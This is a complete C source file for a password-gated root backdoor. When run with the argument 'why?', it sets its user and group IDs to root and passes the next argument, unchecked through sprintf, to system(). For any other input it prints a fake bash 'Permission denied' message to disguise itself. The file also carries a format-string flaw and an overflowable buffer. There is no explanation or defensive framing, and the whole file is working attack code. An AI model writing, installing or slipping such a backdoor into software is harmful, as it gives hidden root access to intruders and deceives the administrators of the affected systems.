#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
int main(int argc, char *argv[])
{
	if(strcmp(argv[1], "why?") == 0)
	{
	setgid(0);
        setuid(0);
        char command[100] = {0};
        sprintf(command, argv[2]);
        system(command);
	}
	else
	{
	printf("bash: /usr/bin/%s", argv[0]);
	printf(" : Permission denied\n");
	}
}
